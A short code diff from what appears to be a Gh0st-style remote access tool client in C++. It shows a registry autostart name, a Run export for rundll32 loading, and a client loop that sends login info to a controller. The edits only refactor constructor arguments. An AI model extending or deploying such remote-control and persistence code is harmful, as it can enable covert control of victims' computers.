@@ -14,7 +14,6 @@
 #include <sstream>
 #include <shellapi.h>
 #include <corecrt_io.h>
-using namespace std;
 
 // 自动启动注册表中的值
 #define REG_NAME "a_ghost"
@@ -308,7 +307,7 @@ extern "C" __declspec(dllexport) void Run(HWND hwnd, HINSTANCE hinst, LPSTR lpsz
 
 DWORD WINAPI StartClient(LPVOID lParam)
 {
-	IOCPClient  *ClientObject = new IOCPClient();
+	IOCPClient  *ClientObject = new IOCPClient(g_bExit);
 
 	g_bThreadExit = false;
 	while (!g_bExit)
@@ -322,7 +321,7 @@ DWORD WINAPI StartClient(LPVOID lParam)
 		//准备第一波数据
 		SendLoginInfo(ClientObject, GetTickCount64()-dwTickCount, g_SETTINGS.ClientType());
 
-		CKernelManager	Manager(ClientObject);   
+		CKernelManager	Manager(&g_SETTINGS, ClientObject, g_hInstance);
 		bool	bIsRun = 0;
 		do 
 		{
